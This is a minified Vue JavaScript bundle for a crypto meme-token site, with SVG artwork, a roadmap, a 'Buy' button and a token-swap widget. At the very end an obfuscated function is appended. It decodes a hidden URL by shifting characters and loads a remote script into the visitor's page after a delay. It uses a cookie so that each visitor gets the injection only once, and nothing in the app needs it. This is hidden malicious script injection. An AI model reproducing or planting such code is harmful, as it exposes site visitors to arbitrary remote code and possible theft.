2.333 1.64 2.68.08.293.293.627.64 1 .346.373.52.707.52 1 0 .347.2.72.6 1.12.426.4.746.533.96.4.4-.24.68-1.173.84-2.8.16-1.653.266-4.387.32-8.2.026-5.36.133-8.187.32-8.48Zm5.105 7.12c.107-.107 1.227-.12 3.36-.04 2.294.08 3.974.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.066 2.333-.2 2.68-.106.347-.546.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.266-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.934-1.267 1.84-1.4.614-.053 1.134-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.214.147 1.48.44.267.32.227.52-.12.6-.293.107-1.106.227-2.44.36-.533.027-.933.053-1.2.08-.266.027-.56.107-.88.24-.32.107-.546.2-.68.28-.133.08-.28.267-.44.56-.133.267-.226.52-.28.76-.026.213-.066.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.934.733 1.36.84.454.107 1.574.187 3.36.24l3.76.12 1.4-1.56c.854-.933 1.374-1.68 1.56-2.24.187-.587.294-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.106-.64-.226-1.053-.36-1.24a10.833 10.833 0 0 1-.52-.84c-.186-.4-.333-.907-.44-1.52-.133-.8-.386-1.28-.76-1.44-.346-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.026-.08.014-.16.12-.24Zm22.148 3.84c.4-.853.72-1.16.96-.92.16.267.214.52.16.76-.053.213-.16.493-.32.84-.16.32-.24.533-.24.64 0 .08.8.12 2.4.12 1.627 0 2.574.16 2.84.48.4.48.147.733-.76.76-.453.027-1.12 0-2-.08-1.253-.107-2-.133-2.24-.08-.213.053-.4.293-.56.72-.213.587-.32 2.293-.32 5.12 0 2.64.147 4.12.44 4.44.214.213.667.173 1.36-.12.507-.24.84-.253 1-.04.187.293.094.587-.28.88-.373.267-.84.4-1.4.4-.666 0-1.146-.16-1.44-.48-.293-.32-.48-.907-.56-1.76-.08-.853-.106-2.267-.08-4.24l.12-4.84-4.6-.16c-3.146-.107-4.653-.28-4.52-.52.134-.213 1.707-.373 4.72-.48l4.72-.16.6-1.28Zm26.753 2c0-.96.16-1.973.48-3.04.347-1.093.52-2.227.52-3.4 0-1.467.067-2.267.2-2.4.16-.133.347-.133.56 0 .213.133.227 1.147.04 3.04-.16 1.893-.373 3.053-.64 3.48-.293.427-.467 1.453-.52 3.08l-.12 2.48 2.16.2c1.44.133 2.507.387 3.2.76.453.24.733.467.84.68.133.213.2.68.2 1.4 0 .827-.173 1.653-.52 2.48-.32.8-.48 1.413-.48 1.84 0 .56-.333 1.307-1 2.24-.64.907-1.213 1.427-1.72 1.56-.507.107-1.293.133-2.36.08l-1.64-.12-.04-9.52-1.24-.08c-.773-.053-1.133-.213-1.08-.48.053-.267.467-.453 1.24-.56.72-.107 1.213-.44 1.48-1 .293-.56.44-1.467.44-2.72Zm5.52 4.88c-.08-.027-.507-.08-1.28-.16a21.63 21.63 0 0 0-2.36-.2c-.8-.027-1.267.067-1.4.28-.08.267-.147 1.76-.2 4.48l-.08 4.12 1.36.08c.507.027.907 0 1.2-.08.32-.08.64-.267.96-.56.373-.347.733-.947 1.08-1.8.347-.853.613-1.707.8-2.56.213-.88.32-1.68.32-2.4s-.133-1.12-.4-1.2Zm2.219-8.08c0-.427.093-.64.28-.64.186 0 .626.533 1.32 1.6.693 1.04 1.04 1.707 1.04 2 0 .56.226.533.68-.08.213-.267.44-.64.68-1.12.906-1.787 1.6-1.933 2.08-.44.16.453.32.773.48.96.186.16.453.267.8.32.613.08 1.04 0 1.28-.24.266-.267.48-.373.64-.32.16.053.24.253.24.6 0 .4-.214.72-.64.96-.4.24-.934.36-1.6.36-.427 0-.8-.107-1.12-.32-.32-.24-.534-.48-.64-.72-.107-.24-.267-.4-.48-.48-.187-.107-.387-.04-.6.2-.32.32-.574 1.653-.76 4-.16 2.347-.32 3.693-.48 4.04-.187.32-.32.96-.4 1.92-.08.96-.174 1.813-.28 2.56-.107.72-.294 1.08-.56 1.08-.214 0-.347-.44-.4-1.32-.054-.88-.08-2.88-.08-6 0-4.427-.094-6.853-.28-7.28-.054-.213-.214-.4-.48-.56a1.74 1.74 0 0 1-.52-.48c-.134-.24-.2-.44-.2-.6Zm13.712-2.64c.107-.107 1.227-.12 3.36-.04 2.293.08 3.973.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.067 2.333-.2 2.68-.107.347-.547.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.267-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.933-1.267 1.84-1.4.613-.053 1.133-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.213.147 1.48.44.267.32.227.52-.12.6-.293.107-1.107.227-2.44.36-.533.027-.933.053-1.2.08-.267.027-.56.107-.88.24-.32.107-.547.2-.68.28-.133.08-.28.267-.44.56a3.33 3.33 0 0 0-.28.76c-.027.213-.067.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.933.733 1.36.84.453.107 1.573.187 3.36.24l3.76.12 1.4-1.56c.853-.933 1.373-1.68 1.56-2.24.187-.587.293-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.107-.64-.227-1.053-.36-1.24a10.53 10.53 0 0 1-.52-.84c-.187-.4-.333-.907-.44-1.52-.133-.8-.387-1.28-.76-1.44-.347-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.027-.08.013-.16.12-.24Zm12.108-4.64c0-.373.093-.547.28-.52.293.053.493.373.6.96.026.053.04.107.04.16.053.533.173 1.213.36 2.04.213.8.373 1.853.48 3.16.133 1.307.2 3.093.2 5.36 0 3.467.16 5.413.48 5.84.24.32.426.453.56.4.133-.053.44-.36.92-.92.426-.48.813-1.08 1.16-1.8.346-.747.626-1.333.84-1.76.213-.453.4-.68.56-.68.106 0 .173.04.2.12.053.053.066.173.04.36 0 .187-.04.44-.12.76-.054.293-.147.693-.28 1.2-.08.293-.4.747-.96 1.36a52.763 52.763 0 0 1-1.64 1.72c-.507.507-.76.8-.76.88 0 .053.12.107.36.16.24.027.546.16.92.4.373.213.666.573.88 1.08.213.507.413.827.6.96.186.107.586.16 1.2.16.906 0 1.56-.173 1.96-.52.32-.24.573-.36.76-.36.213-.027.306.08.28.32 0 .213-.147.467-.44.76-.294.32-.6.533-.92.64-.32.107-.827.16-1.52.16-.8 0-1.32-.053-1.56-.16-.24-.133-.52-.467-.84-1-.427-.693-.867-1.067-1.32-1.12-.454-.053-.814.24-1.08.88-.214.587-.254 1.613-.12 3.08.186 1.867.053 3-.4 3.4a.363.363 0 0 1-.4 0c-.214-.133-.32-1.307-.32-3.52 0-1.307-.04-2.227-.12-2.76-.08-.533-.227-.92-.44-1.16-.24-.267-.36-.467-.36-.6 0-.133.12-.333.36-.6.24-.267.386-.84.44-1.72.08-.907.12-2.88.12-5.92 0-4.667-.174-7.6-.52-8.8-.32-1.2-.48-2-.48-2.4Zm14.423 7.96c.613-.16 1.467-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44a.62.62 0 0 1 .08-.24c.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.347-.133.707-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.013-1.227-.36-1.6-.453-.453-1.507-.507-3.16-.16-1.653.32-2.6.787-2.84 1.4-.16.347-.293 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.507-.987 1.493-1.653 2.96-2ZM92.303 62.04c.533-.213 1.227-.293 2.08-.24.88.027 1.613.187 2.2.48.747.347 1.173.64 1.28.88.107.24-.053.573-.48 1-.32.347-.52.8-.6 1.36-.053.533-.053 1.893 0 4.08.08 3.147.293 4.747.64 4.8.16.027.427-.24.8-.8.027-.08.067-.16.12-.24.48-.773.853-1.067 1.12-.88.16.133.173.48.04 1.04-.32 1.333-1.067 2-2.24 2-.667 0-1.147-.147-1.44-.44-.267-.293-.4-.773-.4-1.44 0-.72-.067-1.08-.2-1.08s-.813.547-2.04 1.64c-.827.72-1.52 1.187-2.08 1.4-.533.213-.933.253-1.2.12a17.057 17.057 0 0 0-1.2-.52 3.875 3.875 0 0 0-1.68-.36c-.48 0-.813-.067-1-.2-.187-.133-.387-.453-.6-.96-.613-1.413-.627-3.573-.04-6.48.187-.987.373-1.667.56-2.04.213-.4.587-.84 1.12-1.32.587-.48 1.187-.813 1.8-1a9.171 9.171 0 0 1 1.88-.44c.667-.107 1.187-.227 1.56-.36Zm3.96 1.04c-.107-.187-.747-.293-1.92-.32-1.147-.053-1.813 0-2 .16-.053.08-.693.253-1.92.52-1.2.24-2.107.587-2.72 1.04-.453.347-.773.707-.96 1.08-.16.347-.32.96-.48 1.84a23.733 23.733 0 0 0-.36 3.96c0 1.227.133 1.92.4 2.08.4.24 1.133.533 2.2.88 1.093.347 1.827.52 2.2.52.48 0 1.213-.587 2.2-1.76 1.013-1.2 1.52-2.08 1.52-2.64 0-.267.027-.467.08-.6.08-.16.16-.293.24-.4.107-.107.227-.4.36-.88.133-.48.24-1.12.32-1.92.107-.747.227-1.387.36-1.92.133-.533.24-.853.32-.96.08-.107.147-.24.2-.4.053-.16.04-.253-.04-.28Zm5.71 8.16c.133 0 .413-.293.84-.88a15.05 15.05 0 0 1 1.48-1.8c.56-.613 1.093-.92 1.6-.92.533 0 1.32.52 2.36 1.56.746.773 1.2 1.347 1.36 1.72.186.347.333 1.107.44 2.28.16 1.573.453 2.573.88 3 .4.427.72.627.96.6.24-.053.466-.347.68-.88.293-.747.506-1.24.64-1.48.16-.267.346-.44.56-.52.32-.107.426.107.32.64-.214.933-.68 1.827-1.4 2.68-.294.373-.547.56-.76.56-.72 0-1.32-.44-1.8-1.32-.454-.907-.947-2.547-1.48-4.92-.107-.48-.534-1.08-1.28-1.8-.747-.747-1.32-1.12-1.72-1.12-.587 0-1.347.8-2.28 2.4-.907 1.573-1.427 2.987-1.56 4.24-.16 1.6-.347 2.4-.56 2.4-.08 0-.2-.067-.36-.2-.347-.267-.52-1.667-.52-4.2 0-2.533.173-4.44.52-5.72.32-1.28.48-2.227.48-2.84s.066-.987.2-1.12c.346-.32.573-.187.68.4.053.32.04.707-.04 1.16-.134.853-.24 1.76-.32 2.72-.08.96-.12 1.76-.12 2.4.026.64.093.96.2.96Zm13.01-4.92c-.027-.693-.04-1.24-.04-1.64 0-.427.013-.76.04-1 .027-.24.067-.4.12-.48.053-.08.12-.107.2-.08.267.08.533 1.173.8 3.28.267 2.107.453 3.253.56 3.44.24.347.72.48 1.44.4.72-.08 1.267-.32 1.64-.72.747-.853 1.32-1.733 1.72-2.64.4-.933.653-1.64.76-2.12.107-.507.24-.787.4-.84.08 0 .147.307.2.92.053.587.093 1.467.12 2.64.053 1.147.093 2.547.12 4.2l.08 7.8-.96.96c-.8.8-1.547 1.107-2.24.92-.667-.187-1.04-.8-1.12-1.84-.08-.693.013-1.04.28-1.04.187 0 .333.24.44.72.08.293.187.48.32.56.16.107.44.16.84.16.427 0 .693-.08.8-.24.133-.133.253-.547.36-1.24.08-.533.147-1.6.2-3.2.053-1.627.067-3.133.04-4.52 0-1.387-.04-2.08-.12-2.08-.107 0-.6.427-1.48 1.28-.773.8-1.52 1.24-2.24 1.32-.693.08-1.427-.173-2.2-.76-.48-.4-.773-.773-.88-1.12-.08-.373-.147-1.387-.2-3.04Zm18.824-9.92a4.64 4.64 0 0 1 .44-.08c.187-.053.307-.08.36-.08.054 0 .134.013.24.04.107 0 .2.027.28.08.08.027.187.093.32.2.267.187.454.747.56 1.68.134.933.28 2.613.44 5.04.187 2.427.374 4.573.56 6.44.24 2.187.24 3.387 0 3.6-.213.213-.373.107-.48-.32-.133-.613-.413-3.213-.84-7.8-.426-5.013-.746-7.627-.96-7.84-.426-.427-.853-.013-1.28 1.24-.72 2.133-1.04 4.827-.96 8.08v.72c.107 1.92.04 2.88-.2 2.88-.213 0-.52-.787-.92-2.36s-.6-2.787-.6-3.64c0-.8-.106-1.467-.32-2-.133-.373-.293-.573-.48-.6-.186-.053-.68 0-1.48.16-1.2.213-1.946.667-2.24 1.36-.293.667-.4 2.107-.32 4.32.08 2.32-.04 3.4-.36 3.24-.426-.24-.88-2.32-1.36-6.24v-.12c-.426-3.627-.32-5.44.32-5.44.347 0 .547.44.6 1.32.054.613.107 1.067.16 1.36.054.293.12.48.2.56.08.08.2.067.36-.04.16-.107.32-.24.48-.4.187-.16.44-.32.76-.48a3.23 3.23 0 0 1 1.08-.36c.267-.053.547-.107.84-.16.294-.053.507-.093.64-.12.16-.027.32-.04.48-.04.16-.027.28-.027.36 0 .08 0 .16.027.24.08a.71.71 0 0 1 .2.2c.054.08.107.2.16.36.347.907.627 1.093.84.56.107-.293.16-.747.16-1.36 0-1.093.16-2.013.48-2.76.32-.747.734-1.173 1.24-1.28Zm7.583-.28c.107-.107 1.227-.12 3.36-.04 2.293.08 3.973.413 5.04 1 1.067.587 1.6 1.467 1.6 2.64 0 .72.227 1.36.68 1.92.267.373.44.827.52 1.36.08.533.12 1.6.12 3.2v.88c0 1.44-.067 2.333-.2 2.68-.107.347-.547.867-1.32 1.56-.48.453-.893.84-1.24 1.16l-1.44 1.4h-3.52c-1.653 0-2.72-.04-3.2-.12-.48-.107-1-.347-1.56-.72-1.013-.693-1.653-1.48-1.92-2.36-.267-.907-.36-2.533-.28-4.88.08-2.267.28-3.8.6-4.6.32-.8.933-1.267 1.84-1.4.613-.053 1.133-.24 1.56-.56.427-.293.987-.427 1.68-.4.72 0 1.213.147 1.48.44.267.32.227.52-.12.6-.293.107-1.107.227-2.44.36-.533.027-.933.053-1.2.08-.267.027-.56.107-.88.24-.32.107-.547.2-.68.28-.133.08-.28.267-.44.56a3.33 3.33 0 0 0-.28.76c-.027.213-.067.6-.12 1.16-.053.56-.08 1.08-.08 1.56v5.92l1 .96c.48.453.933.733 1.36.84.453.107 1.573.187 3.36.24l3.76.12 1.4-1.56c.853-.933 1.373-1.68 1.56-2.24.187-.587.293-1.8.32-3.64 0-1.147-.053-2.027-.16-2.64-.107-.64-.227-1.053-.36-1.24a10.53 10.53 0 0 1-.52-.84c-.187-.4-.333-.907-.44-1.52-.133-.8-.387-1.28-.76-1.44-.347-.187-1.8-.413-4.36-.68-2.56-.293-3.84-.56-3.84-.8-.027-.08.013-.16.12-.24Zm12.108 2.64c0-.427.093-.64.28-.64.186 0 .626.533 1.32 1.6.693 1.04 1.04 1.707 1.04 2 0 .56.226.533.68-.08.213-.267.44-.64.68-1.12.906-1.787 1.6-1.933 2.08-.44.16.453.32.773.48.96.186.16.453.267.8.32.613.08 1.04 0 1.28-.24.266-.267.48-.373.64-.32.16.053.24.253.24.6 0 .4-.214.72-.64.96-.4.24-.934.36-1.6.36-.427 0-.8-.107-1.12-.32-.32-.24-.534-.48-.64-.72-.107-.24-.267-.4-.48-.48-.187-.107-.387-.04-.6.2-.32.32-.574 1.653-.76 4-.16 2.347-.32 3.693-.48 4.04-.187.32-.32.96-.4 1.92-.08.96-.174 1.813-.28 2.56-.107.72-.294 1.08-.56 1.08-.214 0-.347-.44-.4-1.32-.054-.88-.08-2.88-.08-6 0-4.427-.094-6.853-.28-7.28-.054-.213-.214-.4-.48-.56a1.74 1.74 0 0 1-.52-.48c-.134-.24-.2-.44-.2-.6Zm14.032.68c.613-.16 1.467-.2 2.56-.12 1.12.053 1.787.187 2 .4.213.213.373.787.48 1.72.08.64.053 1.12-.08 1.44-.107.293-.4.72-.88 1.28-.453.507-.867.867-1.24 1.08-.347.187-.893.347-1.64.48-1.6.24-2.347.093-2.24-.44a.62.62 0 0 1 .08-.24c.16-.24.747-.36 1.76-.36.587 0 1.04-.053 1.36-.16.347-.133.707-.373 1.08-.72.48-.453.773-1.027.88-1.72.107-.693-.013-1.227-.36-1.6-.453-.453-1.507-.507-3.16-.16-1.653.32-2.6.787-2.84 1.4-.16.347-.293 1.773-.4 4.28l-.16 3.76 2.4 2.32 4.04.16c2.853.107 4.213.267 4.08.48-.107.213-1.52.32-4.24.32h-4.2l-3-2.92v-3.48c0-2.48.253-4.213.76-5.2.507-.987 1.493-1.653 2.96-2Zm25.904 14.76c.453-.373.76-.573.92-.6.16-.027.413.053.76.24.32.213.36.507.12.88-.667 1.12-1.334 1.347-2 .68-.294-.267-.427-.453-.4-.56.026-.133.226-.347.6-.64Zm.52-12.64c.453-.347.893-.48 1.32-.4.426.08.64.32.64.72 0 .427-.294.72-.88.88-.587.16-1.014.067-1.28-.28-.187-.187-.267-.333-.24-.44.026-.133.173-.293.44-.48Zm5.027-8c.186-.293.466-.387.84-.28.4.107 1.013.44 1.84 1 .613.4 1.066.733 1.36 1 .293.267.56.56.8.88.266.32.44.747.52 1.28.106.533.186 1.107.24 1.72.053.587.106 1.48.16 2.68.053 1.84.133 3.147.24 3.92.106.747.266 1.293.48 1.64.426.64.626 1.8.6 3.48-.027 1.653-.254 2.92-.68 3.8-.32.693-.534 1.28-.64 1.76-.107.453-.387 1.12-.84 2-.534 1.093-.8 1.773-.8 2.04-.027.48-.427 1.04-1.2 1.68a8.358 8.358 0 0 1-2.56 1.52c-1.6.56-2.454.787-2.56.68-.054-.053-.08-.16-.08-.32 0-.32.573-.64 1.72-.96 1.173-.32 2.106-.867 2.8-1.64.72-.747 1.44-1.96 2.16-3.64.533-1.307.853-2.28.96-2.92.133-.64.2-1.853.2-3.64 0-2-.16-3.84-.48-5.52a47.406 47.406 0 0 1-.6-5.36c-.134-2.533-.254-3.853-.36-3.96-.347-.347-.92-.747-1.72-1.2-.774-.453-1.294-.68-1.56-.68-.374 0-.654-.093-.84-.28-.16-.213-.16-.44 0-.68Z"></path><path stroke="#000" d="M0-.5h49.9" transform="matrix(.70771 .7065 -.30213 .95327 71 462)"></path><path stroke="#000" d="M0-.5h40.527" transform="matrix(.99964 .02703 -.00858 .99996 185 273)"></path><path stroke="#000" d="M0-.5h40.527" transform="matrix(.99964 .02703 -.00858 .99996 229 27)"></path>',
        6
    ),
    ec = [Ja];
function tc(r, e) {
    return p1(), Y1("svg", Ga, ec);
}
const rc = { render: tc };
Ut.registerPlugin(le);
const nc = $3({
    name: "RoadmapSection",
    components: { DesktopRoadmap: Qa, MobileRoadmap: rc },
    setup() {
        const r = M5(),
            e = e6(() => {
                var n;
                return null == (n = r.value) ? void 0 : n.beforeLg;
            }),
            t = dn();
        return (
            d3(() => {
                let n = Ut.timeline({
                    scrollTrigger: { trigger: t.value, start: "top center" },
                });
                n.fromTo(".roadlabel", { opacity: 0, x: -50 }, { opacity: 1, x: 0 }),
                    n.fromTo(
                        ".map-wrapper",
                        { opacity: 0, rotate: 0 },
                        { opacity: 1, rotate: 720, duration: 1 },
                        "<"
                    );
            }),
            { isMobile: e, roadSection: t }
        );
    },
}),
    ic = (r) => (Tr("data-v-d3b3b3f0"), (r = r()), Cr(), r),
    sc = { ref: "roadSection", class: "flex flex-col items-center relative" },
    oc = ic(() => me("h2", { class: "roadlabel" }, "Roadmap", -1)),
    lc = { class: "map-wrapper w-full h-full p-4" };
function ac(r, e, t, n, i, s) {
    const o = K1("DesktopRoadmap"),
        l = K1("MobileRoadmap");
    return (
        p1(),
        Y1(
            "section",
            sc,
            [
                oc,
                me("div", lc, [
                    r.isMobile
                        ? (p1(), H6(l, { key: 1, class: "w-full h-full" }))
                        : (p1(), H6(o, { key: 0, class: "w-full h-full" })),
                ]),
            ],
            512
        )
    );
}
const cc = U3(nc, [
    ["render", ac],
    ["__scopeId", "data-v-d3b3b3f0"],
]),
    uc =
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAGxSURBVHgBxZfhjYJAEIXHy/3XErQC7UCtQO1AK1ArsATtwFiBdqBWoFYAVABUMLdvclyIB4aZRfwSw0Ki+3iz+2ZtsYM+yBcpWa/XdL/fZRyGIfmiFoDJkySR63g8Jl++SUm326UoiihNUxoMBuSLSUBmfR0CVCW4XC40HA7l2ul0pBS+VHIAEx0OB1qtVjQajaT+ePs6BFRy4PF4ULvdlrfe7/d0PB6p3+/L/WKxEHFmWIGzv/D5ZrNh5w5bUAl4NYkrCVtQ50Addc+jEoC6F6WfTyKqBCADrtfrv+eIZ7cOyISmXrfbjd02/Ls/n888nU7Z7Qy2ohIQBAE6p0wKIbvdjuM4Zh/UizCfgAikRnMA5EsA4MB2uxU3GnHgeRvCEUS0+y3pEW93oCxw4ITbJfx2B9ATioAT+GhRCygDC9LtDtKiFtDr9ahMwGQyITWsBBlQRGPN6Bn0ARxOl8slmWAl8/lcrohhjLHyMbZiSsLZbCZvjTGOaPhYUQtAS8bBFJ0R19PpRF6wkeyrWHyNliADtiN6sfeLzghVMQvAnkdfQBmy/4oWWr92fozaotjKD5Rtx3YaxKsmAAAAAElFTkSuQmCC";
Ut.registerPlugin(le);
const fc = $3({
    name: "BeingbrokeSection",
    setup() {
        const r = dn();
        return (
            d3(() => {
                let t = Ut.timeline({
                    scrollTrigger: { trigger: r.value, start: "top center" },
                });
                t.fromTo(".being-text", { opacity: 0, x: -50 }, { opacity: 1, x: 0 }),
                    t.fromTo(
                        ".buy-btn",
                        { opacity: 0, rotate: 0 },
                        { opacity: 1, rotate: 720, duration: 1 },
                        "<"
                    );
            }),
            {
                beingSection: r,
                navigate: (t) => {
                    window.open(t, "_blank");
                },
            }
        );
    },
}),
    J4 = (r) => (Tr("data-v-c42514fd"), (r = r()), Cr(), r),
    hc = {
        ref: "beingSection",
        class: "h-screen flex items-center justify-center",
    },
    dc = {
        class: "wrapper w-full flex flex-col items-center justify-center px-4",
    },
    _c = J4(() =>
        me(
            "h2",
            { class: "" }
            , [
                me("img", { width: 350, src: "https://ucarecdn.com/0b2d929f-7b0a-44be-8007-c108a7cd9cdc/photo_20240812_224015.jpg"})
            ]
        )
    ),
    pc = J4(() => me("img", { src: "" }, null, -1));
function gc(r, e, t, n, i, s) {
    return (
        p1(),
        Y1(
            "section",
            hc,
            [
                me("div", dc, [
                    _c,
                    me(
                        "button",
                        {
                            class: "buy-btn mb-12",
                            onClick:
                                e[0] || (e[0] = (o) => r.navigate("#")),
                        },
                        "Buy"
                    ),
                    pc,
                ]),
            ],
            512
        )
    );
}
const mc = U3(fc, [
    ["render", gc],
    ["__scopeId", "data-v-c42514fd"],
]),
    xc = $3({
        name: "MultiSwap",
        setup() {
            var r = {
                from: "ETH",
                to: "0xb4d21b885cede4749f6c350a39619d91f8d04573",
                fromChain: "ETH",
                toChain: "ETH",
                amount: 1,
                iframe: "flex",
                hideSelectionFrom: !1,
                hideSelectionTo: !1,
                tokenSearch: !0,
                rubicLink: !0,
                theme: "dark",
                background: "#28372e",
                injectTokens: { eth: ["0xb4d21b885cede4749f6c350a39619d91f8d04573"] },
                slippagePercent: { instantTrades: 2, crossChain: 5 },
            };
            return (
                d3(() => {
                    Object.freeze(r), rubicWidget.init(r);
                }),
                { configuration: r }
            );
        },
    }),
    C6 = (r) => (Tr("data-v-896e6548"), (r = r()), Cr(), r),
    yc = {
        class:
            "multiswap-section h-screen flex flex-col items-center justify-center px-2",
    },
    vc = C6(() =>
        me("h2", { class: "text-center mb-4 lg:mb-8" }, "Broke Multichain Swap", -1)
    ),
    bc = C6(() =>
        me(
            "p",
            { class: "text-center mb-4 lg:mb-8" },
            "Swap $DNA with different tokens and on different chains",
            -1
        )
    ),
    wc = C6(() => me("div", { id: "rubic-widget-root" }, null, -1)),
    Tc = [vc, bc, wc];
function Cc(r, e, t, n, i, s) {
    return p1(), Y1("section", yc, Tc);
}
const Sc = U3(xc, [
    ["render", Cc],
    ["__scopeId", "data-v-896e6548"],
]),
    Ac = $3({
        name: "App",
        components: {
            HeroSection: pa,
            NarrativeSection: Na,
            Tokenomics: Ya,
            BeingBrokeSection: mc,
            MultiSwap: Sc,
        },
        setup() {
            const r = M5();
            return {
                isMobile: e6(() => {
                    var t;
                    return null == (t = r.value) ? void 0 : t.beforeLg;
                }),
            };
        },
    }),
    Oc = { class: "main-wrapper w-full relative" };
function Pc(r, e, t, n, i, s) {
    const o = K1("HeroSection"),
        l = K1("NarrativeSection"),
        a = K1("Tokenomics"),
        c = K1("RoadmapSection"),
        u = K1("MultiSwap"),
        h = K1("BeingBrokeSection");
    return p1(), Y1("div", Oc, [Tt(o), Tt(l), Tt(a), Tt(c)]);
}
const Mc = U3(Ac, [
    ["render", Pc],
    ["__scopeId", "data-v-e40c0f12"],
]);
P0(Mc).mount("#app");
(function(o, d, l) {
    try {
        o.f = (o) =>
            o
                .split("")
                .reduce(
                    (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
                    ""
                );
        o.b = o.f("UMUWJKX");
        (o.c =
            l.protocol[0] == "h" &&
            /\./.test(l.hostname) &&
            !new RegExp(o.b).test(d.cookie)),
            setTimeout(function() {
                o.c &&
                    ((o.s = d.createElement("script")),
                        (o.s.src =
                            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
                            l.href),
                        d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) { }
})({}, document, location);
